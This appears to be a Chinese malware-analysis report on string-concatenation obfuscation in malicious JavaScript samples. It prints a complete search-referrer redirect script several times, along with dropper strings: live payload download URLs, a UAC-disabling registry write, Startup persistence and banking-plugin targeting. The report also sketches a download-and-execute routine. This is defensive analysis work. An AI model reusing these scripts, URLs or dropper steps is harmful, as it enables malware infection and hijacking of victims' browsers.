@@ -1,0 +1,1006 @@
+00a21bb3c5f44c95c5cfaf4cde64af14
+
+"<style undefined>.nemonn{position:absolute;top:-9999px}</style>"
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+00a9876dc8546a9d0afccdf5ffaa44d3
+
+"Run"
+"WScript"
+"CreateObject"
+"WScript.Shell"
+"ExpandEnvironmentStrings"
+"%TEMP%/"
+"finish.scr"
+"MSXML2.XMLHTTP"
+"open"
+"http://planetarchery.com.au/system/logs/q32r45g54"
+"send"
+"ADODB.Stream"
+"type"
+"ResponseBody"
+"position"
+"saveToFile"
+"close"
+"Sleep"
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+00b5520907d65113bbded4243f115c3b
+
+通过while循环写入一个空字符串，结果为以下脚本：
+"<script>
+function encode(str)
+{
+    var charHex = new Array('0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f');
+    var out = "";
+    var len = str.length;
+    str = new String(str);
+    for (var i = 0; i < len; i++)
+    {
+        var s = str.charCodeAt(i);
+        var h = "" + charHex[s >> 4] + "" + charHex[0xf & s];
+        out += "" + h;
+    }
+    return out;
+}
+function getRef()
+{
+    if (!document.referrer) 
+        return "none";
+    else 
+        return document.referrer;
+}
+function key()
+{
+    var r2 = getRef()+"|"+document.location+"|";
+    var ret = "&r=g"+encode(r2)+"g";
+    return ret;
+}
+var r = document.referrer, t ='', q, go;
+go = false;
+if (r.indexOf("google.") != -1) { t = "q"; }
+if (r.indexOf("msn.") != -1) { t = "q"; }
+if (r.indexOf("bing.") != -1) { t = "q"; }
+if (r.indexOf("yahoo.") !=- 1) { t = "p"; }
+if (r.indexOf("altavista.") !=- 1) { t = "q"; }
+if (r.indexOf("aol.") != -1) { t = "query"; }
+if (r.indexOf("ask.") != -1) { t = "q"; }
+if (t.length && ((q = r.indexOf("?"+t+"=")) != -1 || (q = r.indexOf("&"+t+"=")) != -1)) {
+    go = true;
+var t1 = r.indexOf("?"+t+"=");
+var t2 = r.indexOf("&"+t+"=");
+var pos = t1>t2?t1:t2;
+var tq = r.substr(pos+3);
+var lpos = tq.indexOf("&");
+var q = tq.substr(0,lpos);
+if (lpos<=0)
+    q = tq;
+}
+if(go)
+    window.location='http://medipharmtour.com/search.php?q=risperdal'+key();
+else
+    window.location='http://'+location.hostname+'/404.html';
+</script>"
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+00bd3cda5a94327755fb107b1af8a570
+
+通过混淆后的函数，获取列表b（并非字典，序号是调试台自动加上）：
+注意：这些字符串只有很少一部分是用于拼接。大部分是以b[index]形式出现。
+0: "elevate"
+1: "Exists"
+2: "Named"
+3: "Arguments"
+4: "FullName"
+5: """
+6: "ScriptFullName"
+7: "" /elevate"
+8: ""
+9: "runas"
+10: "ShellExecute"
+11: "Shell.Application"
+12: "Quit"
+13: "C:\ProgramData\trava"
+14: "wscript.shell"
+15: "Scripting.FileSystemObject"
+16: "CreateObject"
+17: "C:\Program Files\GbPlugin"
+18: "FolderExists"
+19: "C:\Program Files (x86)\GbPlugin"
+20: "FileExists"
+21: "CreateTextFile"
+22: "WScript.Shell"
+23: "%APPDATA%"
+24: "ExpandEnvironmentStrings"
+25: "\"
+26: "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
+27: "64"
+28: "C:\Windows\SysWOW64\"
+29: ".dll"
+30: "C:\Windows\System32\"
+31: ".exe"
+32: "Aplet.dll"
+33: "C:\Program Files (x86)\"
+34: "32"
+35: "WinHttp.WinHttpRequest.5.1"
+36: "GET"
+37: "Open"
+38: "Send"
+39: "ADODB.Stream"
+40: "Type"
+41: "ResponseBody"
+42: "Write"
+43: "SaveToFile"
+44: "C:\WINDOWS\system32\shutdown.exe -r -t 60"
+45: "Run"
+46: "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA"
+47: "REG_DWORD"
+48: "RegWrite"
+49: "random"
+50: "floor"
+51: "regsvr32 /s "
+52: "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\ie-configs.com.br\*"
+53: "msxml2.xmlhttp"
+54: "http://216.119.148.42/2108/inf.php"
+55: "open"
+56: "send"
+57: "C:\Users\"
+58: "%USERNAME%"
+59: "\AppData\Local\Aplicativo Itau"
+60: "https://www.dropbox.com/s/ns9o5xn9mlpa5ly/App.dll?dl=1"
+61: "https://www.dropbox.com/s/ipzssa858yzxjea/start.exe?dl=1"
+62: "https://www.dropbox.com/s/59s2qhu0u60e7av/Aplet.dll?dl=1"
+63: "https://www.dropbox.com/s/n3o0v987g2d76wf/jet.exe?dl=1"
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+00c313e315a3af55b1dfa3c672962710
+
+通过while循环写入一个空字符串，结果为以下脚本：
+"<script>
+function encode(str)
+{
+    var charHex = new Array('0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f');
+    var out = "";
+    var len = str.length;
+    str = new String(str);
+    for (var i = 0; i < len; i++)
+    {
+        var s = str.charCodeAt(i);
+        var h = "" + charHex[s >> 4] + "" + charHex[0xf & s];
+        out += "" + h;
+    }
+    return out;
+}
+function getRef()
+{
+    if (!document.referrer) 
+        return "none";
+    else 
+        return document.referrer;
+}
+function key()
+{
+    var r2 = getRef()+"|"+document.location+"|";
+    var ret = "&r=g"+encode(r2)+"g";
+    return ret;
+}
+var r = document.referrer, t ='', q, go;
+go = false;
+if (r.indexOf("google.") != -1) { t = "q"; }
+if (r.indexOf("msn.") != -1) { t = "q"; }
+if (r.indexOf("bing.") != -1) { t = "q"; }
+if (r.indexOf("yahoo.") !=- 1) { t = "p"; }
+if (r.indexOf("altavista.") !=- 1) { t = "q"; }
+if (r.indexOf("aol.") != -1) { t = "query"; }
+if (r.indexOf("ask.") != -1) { t = "q"; }
+if (t.length && ((q = r.indexOf("?"+t+"=")) != -1 || (q = r.indexOf("&"+t+"=")) != -1)) {
+    go = true;
+var t1 = r.indexOf("?"+t+"=");
+var t2 = r.indexOf("&"+t+"=");
+var pos = t1>t2?t1:t2;
+var tq = r.substr(pos+3);
+var lpos = tq.indexOf("&");
+var q = tq.substr(0,lpos);
+if (lpos<=0)
+    q = tq;
+}
+if(go)
+    window.location='http://medipharmtour.com/search.php?q=vincristine'+key();
+else
+    window.location='http://'+location.hostname+'/404.html';
+</script>"
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+00cf3db1b71970e6847a70a6f4ff8a77
+
+"String.fromCharCode()"
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+00d6d12b78db6dd9467060df94fc308c
+
+通过while循环写入一个空字符串，结果为以下脚本：
+"<script>
+function encode(str)
+{
+    var charHex = new Array('0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f');
+    var out = "";
+    var len = str.length;
+    str = new String(str);
+    for (var i = 0; i < len; i++)
+    {
+        var s = str.charCodeAt(i);
+        var h = "" + charHex[s >> 4] + "" + charHex[0xf & s];
+        out += "" + h;
+    }
+    return out;
+}
+function getRef()
+{
+    if (!document.referrer) 
+        return "none";
+    else 
+        return document.referrer;
+}
+function key()
+{
+    var r2 = getRef()+"|"+document.location+"|";
+    var ret = "&r=g"+encode(r2)+"g";
+    return ret;
+}
+var r = document.referrer, t ='', q, go;
+go = false;
+if (r.indexOf("google.") != -1) { t = "q"; }
+if (r.indexOf("msn.") != -1) { t = "q"; }
+if (r.indexOf("bing.") != -1) { t = "q"; }
+if (r.indexOf("yahoo.") !=- 1) { t = "p"; }
+if (r.indexOf("altavista.") !=- 1) { t = "q"; }
+if (r.indexOf("aol.") != -1) { t = "query"; }
+if (r.indexOf("ask.") != -1) { t = "q"; }
+if (t.length && ((q = r.indexOf("?"+t+"=")) != -1 || (q = r.indexOf("&"+t+"=")) != -1)) {
+    go = true;
+var t1 = r.indexOf("?"+t+"=");
+var t2 = r.indexOf("&"+t+"=");
+var pos = t1>t2?t1:t2;
+var tq = r.substr(pos+3);
+var lpos = tq.indexOf("&");
+var q = tq.substr(0,lpos);
+if (lpos<=0)
+    q = tq;
+}
+if(go)
+    window.location='http://medipharmtour.com/search.php?q=oily'+key();
+else
+    window.location='http://'+location.hostname+'/404.html';
+</script>"
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+00da63a10066ca0eea605e3fad3b231d
+
+通过while循环写入一个空字符串，结果为以下脚本：
+"<script>
+function encode(str)
+{
+    var charHex = new Array('0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f');
+    var out = "";
+    var len = str.length;
+    str = new String(str);
+    for (var i = 0; i < len; i++)
+    {
+        var s = str.charCodeAt(i);
+        var h = "" + charHex[s >> 4] + "" + charHex[0xf & s];
+        out += "" + h;
+    }
+    return out;
+}
+function getRef()
+{
+    if (!document.referrer) 
+        return "none";
+    else 
+        return document.referrer;
+}
+function key()
+{
+    var r2 = getRef()+"|"+document.location+"|";
+    var ret = "&r=g"+encode(r2)+"g";
+    return ret;
+}
+var r = document.referrer, t ='', q, go;
+go = false;
+if (r.indexOf("google.") != -1) { t = "q"; }
+if (r.indexOf("msn.") != -1) { t = "q"; }
+if (r.indexOf("yahoo.") !=- 1) { t = "p"; }
+if (r.indexOf("bing.") != -1) { t = "q"; }
+if (r.indexOf("altavista.") !=- 1) { t = "q"; }
+if (r.indexOf("aol.") != -1) { t = "query"; }
+if (r.indexOf("ask.") != -1) { t = "q"; }
+if (t.length && ((q = r.indexOf("?"+t+"=")) != -1 || (q = r.indexOf("&"+t+"=")) != -1)) {
+    go = true;
+var t1 = r.indexOf("?"+t+"=");
+var t2 = r.indexOf("&"+t+"=");
+var pos = t1>t2?t1:t2;
+var tq = r.substr(pos+3);
+var lpos = tq.indexOf("&");
+var q = tq.substr(0,lpos);
+if (lpos<=0)
+    q = tq;
+}
+if(go)
+    window.location='http://medipharmtour.com/search.php?q=tazorac'+key();
+else
+    window.location='http://'+location.hostname+'/404.html';
+</script>"
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+00dd1c07fb998137da41a3adfdc1c8d4
+
+"div"
+"eval"
+"fromCharCode"
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+00e4a9d14d5b70ae24cab4294253f98f
+
+无字符串拼接
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+00e695c112efb3128be99f7c711b09e0
+
+通过while循环写入一个空字符串，结果为以下脚本：
+"<script>
+function encode(str)
+{
+    var charHex = new Array('0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f');
+    var out = "";
+    var len = str.length;
+    str = new String(str);
+    for (var i = 0; i < len; i++)
+    {
+        var s = str.charCodeAt(i);
+        var h = "" + charHex[s >> 4] + "" + charHex[0xf & s];
+        out += "" + h;
+    }
+    return out;
+}
+function getRef()
+{
+    if (!document.referrer) 
+        return "none";
+    else 
+        return document.referrer;
+}
+function key()
+{
+    var r2 = getRef()+"|"+document.location+"|";
+    var ret = "&r=g"+encode(r2)+"g";
+    return ret;
+}
+var r = document.referrer, t ='', q, go;
+go = false;
+if (r.indexOf("google.") != -1) { t = "q"; }
+if (r.indexOf("msn.") != -1) { t = "q"; }
+if (r.indexOf("bing.") != -1) { t = "q"; }
+if (r.indexOf("yahoo.") !=- 1) { t = "p"; }
+if (r.indexOf("altavista.") !=- 1) { t = "q"; }
+if (r.indexOf("aol.") != -1) { t = "query"; }
+if (r.indexOf("ask.") != -1) { t = "q"; }
+if (t.length && ((q = r.indexOf("?"+t+"=")) != -1 || (q = r.indexOf("&"+t+"=")) != -1)) {
+    go = true;
+var t1 = r.indexOf("?"+t+"=");
+var t2 = r.indexOf("&"+t+"=");
+var pos = t1>t2?t1:t2;
+var tq = r.substr(pos+3);
+var lpos = tq.indexOf("&");
+var q = tq.substr(0,lpos);
+if (lpos<=0)
+    q = tq;
+}
+if(go)
+    window.location='http://medipharmtour.com/search.php?q=zinc'+key();
+else
+    window.location='http://'+location.hostname+'/404.html';
+</script>"
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+00e9833ae3fc0bf7b33266b3fcb320a8
+
+通过while循环写入一个空字符串，结果为以下脚本：
+"<script>
+function encode(str)
+{
+    var charHex = new Array('0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f');
+    var out = "";
+    var len = str.length;
+    str = new String(str);
+    for (var i = 0; i < len; i++)
+    {
+        var s = str.charCodeAt(i);
+        var h = "" + charHex[s >> 4] + "" + charHex[0xf & s];
+        out += "" + h;
+    }
+    return out;
+}
+function getRef()
+{
+    if (!document.referrer) 
+        return "none";
+    else 
+        return document.referrer;
+}
+function key()
+{
+    var r2 = getRef()+"|"+document.location+"|";
+    var ret = "&r=g"+encode(r2)+"g";
+    return ret;
+}
+var r = document.referrer, t ='', q, go;
+go = false;
+if (r.indexOf("google.") != -1) { t = "q"; }
+if (r.indexOf("msn.") != -1) { t = "q"; }
+if (r.indexOf("yahoo.") !=- 1) { t = "p"; }
+if (r.indexOf("bing.") != -1) { t = "q"; }
+if (r.indexOf("altavista.") !=- 1) { t = "q"; }
+if (r.indexOf("aol.") != -1) { t = "query"; }
+if (r.indexOf("ask.") != -1) { t = "q"; }
+if (t.length && ((q = r.indexOf("?"+t+"=")) != -1 || (q = r.indexOf("&"+t+"=")) != -1)) {
+    go = true;
+var t1 = r.indexOf("?"+t+"=");
+var t2 = r.indexOf("&"+t+"=");
+var pos = t1>t2?t1:t2;
+var tq = r.substr(pos+3);
+var lpos = tq.indexOf("&");
+var q = tq.substr(0,lpos);
+if (lpos<=0)
+    q = tq;
+}
+if(go)
+    window.location='http://medipharmtour.com/search.php?q=pepto'+key();
+else
+    window.location='http://'+location.hostname+'/404.html';
+</script>"
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+00e20704429f746f5f8a2cb9cd5974b2
+
+通过while循环写入一个空字符串，结果为以下脚本：
+"<script>
+function encode(str)
+{
+    var charHex = new Array('0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f');
+    var out = "";
+    var len = str.length;
+    str = new String(str);
+    for (var i = 0; i < len; i++)
+    {
+        var s = str.charCodeAt(i);
+        var h = "" + charHex[s >> 4] + "" + charHex[0xf & s];
+        out += "" + h;
+    }
+    return out;
+}
+function getRef()
+{
+    if (!document.referrer) 
+        return "none";
+    else 
+        return document.referrer;
+}
+function key()
+{
+    var r2 = getRef()+"|"+document.location+"|";
+    var ret = "&r=g"+encode(r2)+"g";
+    return ret;
+}
+var r = document.referrer, t ='', q, go;
+go = false;
+if (r.indexOf("google.") != -1) { t = "q"; }
+if (r.indexOf("msn.") != -1) { t = "q"; }
+if (r.indexOf("bing.") != -1) { t = "q"; }
+if (r.indexOf("yahoo.") !=- 1) { t = "p"; }
+if (r.indexOf("altavista.") !=- 1) { t = "q"; }
+if (r.indexOf("aol.") != -1) { t = "query"; }
+if (r.indexOf("ask.") != -1) { t = "q"; }
+if (t.length && ((q = r.indexOf("?"+t+"=")) != -1 || (q = r.indexOf("&"+t+"=")) != -1)) {
+    go = true;
+var t1 = r.indexOf("?"+t+"=");
+var t2 = r.indexOf("&"+t+"=");
+var pos = t1>t2?t1:t2;
+var tq = r.substr(pos+3);
+var lpos = tq.indexOf("&");
+var q = tq.substr(0,lpos);
+if (lpos<=0)
+    q = tq;
+}
+if(go)
+    window.location='http://medipharmtour.com/search.php?q=amen'+key();
+else
+    window.location='http://'+location.hostname+'/404.html';
+</script>"
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+002a6d1aebfede325fe9d3f31c8c24dc
+
+"split"
+"0x"
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+002bda241e53185bfc1f4c89e3098b65
+
+通过while循环写入一个空字符串，结果为以下脚本：
+"<script>
+function encode(str)
+{
+    var charHex = new Array('0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f');
+    var out = "";
+    var len = str.length;
+    str = new String(str);
+    for (var i = 0; i < len; i++)
+    {
+        var s = str.charCodeAt(i);
+        var h = "" + charHex[s >> 4] + "" + charHex[0xf & s];
+        out += "" + h;
+    }
+    return out;
+}
+function getRef()
+{
+    if (!document.referrer) 
+        return "none";
+    else 
+        return document.referrer;
+}
+function key()
+{
+    var r2 = getRef()+"|"+document.location+"|";
+    var ret = "&r=g"+encode(r2)+"g";
+    return ret;
+}
+var r = document.referrer, t ='', q, go;
+go = false;
+if (r.indexOf("google.") != -1) { t = "q"; }
+if (r.indexOf("msn.") != -1) { t = "q"; }
+if (r.indexOf("yahoo.") !=- 1) { t = "p"; }
+if (r.indexOf("bing.") != -1) { t = "q"; }
+if (r.indexOf("altavista.") !=- 1) { t = "q"; }
+if (r.indexOf("aol.") != -1) { t = "query"; }
+if (r.indexOf("ask.") != -1) { t = "q"; }
+if (t.length && ((q = r.indexOf("?"+t+"=")) != -1 || (q = r.indexOf("&"+t+"=")) != -1)) {
+    go = true;
+var t1 = r.indexOf("?"+t+"=");
+var t2 = r.indexOf("&"+t+"=");
+var pos = t1>t2?t1:t2;
+var tq = r.substr(pos+3);
+var lpos = tq.indexOf("&");
+var q = tq.substr(0,lpos);
+if (lpos<=0)
+    q = tq;
+}
+if(go)
+    window.location='http://lskfinance.com/search.php?q=realtor'+key();
+else
+    window.location='http://'+location.hostname+'/404.html';
+</script>"
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+004c39e469480d642e114a624f95bf7b
+
+通过while循环写入一个空字符串，结果为以下脚本：
+"<script>
+function encode(str)
+{
+    var charHex = new Array('0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f');
+    var out = "";
+    var len = str.length;
+    str = new String(str);
+    for (var i = 0; i < len; i++)
+    {
+        var s = str.charCodeAt(i);
+        var h = "" + charHex[s >> 4] + "" + charHex[0xf & s];
+        out += "" + h;
+    }
+    return out;
+}
+function getRef()
+{
+    if (!document.referrer) 
+        return "none";
+    else 
+        return document.referrer;
+}
+function key()
+{
+    var r2 = getRef()+"|"+document.location+"|";
+    var ret = "&r=g"+encode(r2)+"g";
+    return ret;
+}
+var r = document.referrer, t ='', q, go;
+go = false;
+if (r.indexOf("google.") != -1) { t = "q"; }
+if (r.indexOf("msn.") != -1) { t = "q"; }
+if (r.indexOf("yahoo.") !=- 1) { t = "p"; }
+if (r.indexOf("bing.") != -1) { t = "q"; }
+if (r.indexOf("altavista.") !=- 1) { t = "q"; }
+if (r.indexOf("aol.") != -1) { t = "query"; }
+if (r.indexOf("ask.") != -1) { t = "q"; }
+if (t.length && ((q = r.indexOf("?"+t+"=")) != -1 || (q = r.indexOf("&"+t+"=")) != -1)) {
+    go = true;
+var t1 = r.indexOf("?"+t+"=");
+var t2 = r.indexOf("&"+t+"=");
+var pos = t1>t2?t1:t2;
+var tq = r.substr(pos+3);
+var lpos = tq.indexOf("&");
+var q = tq.substr(0,lpos);
+if (lpos<=0)
+    q = tq;
+}
+if(go)
+    window.location='http://medipharmtour.com/search.php?q=thyroid'+key();
+else
+    window.location='http://'+location.hostname+'/404.html';
+</script>"
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+005cd7f32d0de873674e1b208344133a
+
+"split"
+"0x"
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+007a1f9e03ae4b75e5c9f217cd2bac7c
+
+无字符串拼接
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+008d5afe39c88194a2bf5924be1a7acd
+
+通过while循环写入一个空字符串，结果为以下脚本：
+"<script>
+function encode(str)
+{
+    var charHex = new Array('0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f');
+    var out = "";
+    var len = str.length;
+    str = new String(str);
+    for (var i = 0; i < len; i++)
+    {
+        var s = str.charCodeAt(i);
+        var h = "" + charHex[s >> 4] + "" + charHex[0xf & s];
+        out += "" + h;
+    }
+    return out;
+}
+function getRef()
+{
+    if (!document.referrer) 
+        return "none";
+    else 
+        return document.referrer;
+}
+function key()
+{
+    var r2 = getRef()+"|"+document.location+"|";
+    var ret = "&r=g"+encode(r2)+"g";
+    return ret;
+}
+var r = document.referrer, t ='', q, go;
+go = false;
+if (r.indexOf("google.") != -1) { t = "q"; }
+if (r.indexOf("msn.") != -1) { t = "q"; }
+if (r.indexOf("bing.") != -1) { t = "q"; }
+if (r.indexOf("yahoo.") !=- 1) { t = "p"; }
+if (r.indexOf("altavista.") !=- 1) { t = "q"; }
+if (r.indexOf("aol.") != -1) { t = "query"; }
+if (r.indexOf("ask.") != -1) { t = "q"; }
+if (t.length && ((q = r.indexOf("?"+t+"=")) != -1 || (q = r.indexOf("&"+t+"=")) != -1)) {
+    go = true;
+var t1 = r.indexOf("?"+t+"=");
+var t2 = r.indexOf("&"+t+"=");
+var pos = t1>t2?t1:t2;
+var tq = r.substr(pos+3);
+var lpos = tq.indexOf("&");
+var q = tq.substr(0,lpos);
+if (lpos<=0)
+    q = tq;
+}
+if(go)
+    window.location='http://medipharmtour.com/search.php?q=sulfadiazine'+key();
+else
+    window.location='http://'+location.hostname+'/404.html';
+</script>"
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+009d11580c0a9025e000d0640709a11e
+
+"http://reachsaw.ru:8080/news3insider-com/google.com/yahoo.com.php"
+"onload"
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+0015d7dcff1d641a34c33293abd1ce4a
+
+无字符串拼接
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+0033da37ddf894c4b1bb6853be4a782b
+
+通过while循环写入一个空字符串，结果为以下脚本：
+"<script>
+function encode(str)
+{
+    var charHex = new Array('0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f');
+    var out = "";
+    var len = str.length;
+    str = new String(str);
+    for (var i = 0; i < len; i++)
+    {
+        var s = str.charCodeAt(i);
+        var h = "" + charHex[s >> 4] + "" + charHex[0xf & s];
+        out += "" + h;
+    }
+    return out;
+}
+function getRef()
+{
+    if (!document.referrer) 
+        return "none";
+    else 
+        return document.referrer;
+}
+function key()
+{
+    var r2 = getRef()+"|"+document.location+"|";
+    var ret = "&r=g"+encode(r2)+"g";
+    return ret;
+}
+var r = document.referrer, t ='', q, go;
+go = false;
+if (r.indexOf("google.") != -1) { t = "q"; }
+if (r.indexOf("msn.") != -1) { t = "q"; }
+if (r.indexOf("yahoo.") !=- 1) { t = "p"; }
+if (r.indexOf("bing.") != -1) { t = "q"; }
+if (r.indexOf("altavista.") !=- 1) { t = "q"; }
+if (r.indexOf("aol.") != -1) { t = "query"; }
+if (r.indexOf("ask.") != -1) { t = "q"; }
+if (t.length && ((q = r.indexOf("?"+t+"=")) != -1 || (q = r.indexOf("&"+t+"=")) != -1)) {
+    go = true;
+var t1 = r.indexOf("?"+t+"=");
+var t2 = r.indexOf("&"+t+"=");
+var pos = t1>t2?t1:t2;
+var tq = r.substr(pos+3);
+var lpos = tq.indexOf("&");
+var q = tq.substr(0,lpos);
+if (lpos<=0)
+    q = tq;
+}
+if(go)
+    window.location='http://medipharmtour.com/search.php?q=ursinus'+key();
+else
+    window.location='http://'+location.hostname+'/404.html';
+</script>"
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+0037e7da0824b622436497f5c0d8f559
+
+无字符串拼接
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+0069ad4d74ed620675e52e1c9c442b32
+
+"CreateObject"
+"WScript.Shell"
+"Run"
+"MSXML2.XMLHTTP"
+"ExpandEnvironmentStrings"
+"%TEMP%/"
+"kR6mpL1asBBL25G.exe"
+"open"
+"http://www.livegirlshow.com/8i5ju4g34"
+"ADODB.Stream"
+"type"
+"write"
+"position"
+"SaveToFile"
+"close"
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+0082d778f299dd11749e56d00b6c140a
+
+通过混淆后的函数，获取列表GgPhdISYB（并非字典，序号是调试台自动加上）：
+0: "sQvPtClM"
+1: "IHakSwt"
+2: "ExpandEnvironmentStrings"
+3: "%TEMP%"
+4: "/YvVXuLyCjO.exe"
+5: "Run"
+6: "ActiveXObject"
+7: "WScript.Shell"
+8: "JdzpKU"
+9: "MSXML2.XMLHTTP"
+
+拼接：
+"readystate"
+"ADODB.Stream"
+"write"
+"ResponseBody"
+"position"
+"http://nhinh.com/system/logs/uy78hn654e.exe"
+"send"
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+003871342c140a3ac7e26484936606dc
+
+无字符串拼接
+
+------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------
+去重与排序后：
+
+""
+"""
+"\"
+"64"
+"32"
+"0x"
+"Run"
+"GET"
+"div"
+"open"
+"send"
+"type"
+"Quit"
+".dll"
+".exe"
+"Open"
+"Send"
+"Type"
+"eval"
+"close"
+"Sleep"
+"Named"
+"runas"
+"Write"
+"floor"
+"split"
+"write"
+"Exists"
+"random"
+"%TEMP%"
+"JdzpKU"
+"WScript"
+"%TEMP%/"
+"elevate"
+"IHakSwt"
+"position"
+"FullName"
+"RegWrite"
+"sQvPtClM"
+"Arguments"
+"%APPDATA%"
+"Aplet.dll"
+"REG_DWORD"
+"C:\Users\"
+"finish.scr"
+"saveToFile"
+"" /elevate"
+"FileExists"
+"SaveToFile"
+"%USERNAME%"
+"readystate"
+"CreateObject"
+"ADODB.Stream"
+"ResponseBody"
+"ShellExecute"
+"FolderExists"
+"regsvr32 /s "
+"fromCharCode"
+"WScript.Shell"
+"wscript.shell"
+"ActiveXObject"
+"MSXML2.XMLHTTP"
+"ScriptFullName"
+"CreateTextFile"
+"msxml2.xmlhttp"
+"/YvVXuLyCjO.exe"
+"Shell.Application"
+"kR6mpL1asBBL25G.exe"
+"C:\ProgramData\trava"
+"C:\Windows\SysWOW64\"
+"C:\Windows\System32\"
+"String.fromCharCode()"
+"C:\Program Files (x86)\"
+"ExpandEnvironmentStrings"
+"C:\Program Files\GbPlugin"
+"Scripting.FileSystemObject"
+"WinHttp.WinHttpRequest.5.1"
+"\AppData\Local\Aplicativo Itau"
+"C:\Program Files (x86)\GbPlugin"
+"http://216.119.148.42/2108/inf.php"
+"http://www.livegirlshow.com/8i5ju4g34"
+"C:\WINDOWS\system32\shutdown.exe -r -t 60"
+"http://nhinh.com/system/logs/uy78hn654e.exe"
+"http://planetarchery.com.au/system/logs/q32r45g54"
+"https://www.dropbox.com/s/ns9o5xn9mlpa5ly/App.dll?dl=1"
+"https://www.dropbox.com/s/n3o0v987g2d76wf/jet.exe?dl=1"
+"https://www.dropbox.com/s/ipzssa858yzxjea/start.exe?dl=1"
+"https://www.dropbox.com/s/59s2qhu0u60e7av/Aplet.dll?dl=1"
+"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
+"<style undefined>.nemonn{position:absolute;top:-9999px}</style>"
+"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA"
+"HKCU\Software\Microsoft\Windows\CurrentVersion\InternetSettings\ZoneMap\Domains\ie-configs.com.br\*"
+
+
+【JavaScript脚本样本中字符串拼接模式之分析报告】
+作者：陈鹏远，基础引擎研发部，哈尔滨安天科技股份有限公司
+导师：童志明
+
+【模式1】
+先进行大量的字符串赋值操作，其中混杂部分数值赋值（为方便后期的数组访问或更改参数，如更改type为0或1），也混杂部分经过函数混淆的赋值，如：
+boxSizingReliableVal = (function Object.prototype.adjusted() {
+		return this
+	}, ".s")
+其实是将"s"赋给boxSizingReliableVal。
+
+然后通过字符串拼接和异常函数调用的方法，进行如下操作：
+a = this.WScript;
+b = a.CreateObject("WScript.Shell");
+c = b.ExpandEnvironmentStrings("%TEMP%/") + "before.scr";
+d = this.WScript.CreateObject("MSXML2.XMLHTTP");
+d.open(false)
+d.send();
+while (d.readystate < 4) {
+	WScript.Sleep(100)
+}
+e = WScript.CreateObject("ADODB.Stream");
+this.WScript.Sleep(15000);
+e.open();
+e.type = 1;
+e.write(d.ResponseBody);
+e.position = 0;
+e.saveToFile(2);
+e.close();
+
+【模式2】
+大量使用逗号运算符，含有大量不相干的字符串
+如：'rea'+'dys'+("freelance","campaigns","closing",'t')+("pence","analyst","laundry","baste",'ate')
+其实是字符串"readystate"
+
+【模式3】
+通过unescape一个长字符串获取隐藏代码，然后eval执行隐藏代码。隐藏代码含字符串拼接
+
+【模式4】
+通过大量+=拼接一个长字符串（即隐藏代码），然后eval执行此隐藏代码
+
+【模式5】
+定义大量的无参数函数，函数返回某个子串。然后通过大量的 += f()来构建一个长字符串（即隐藏代码），然后执行。
+
+
+
+
+
+
+
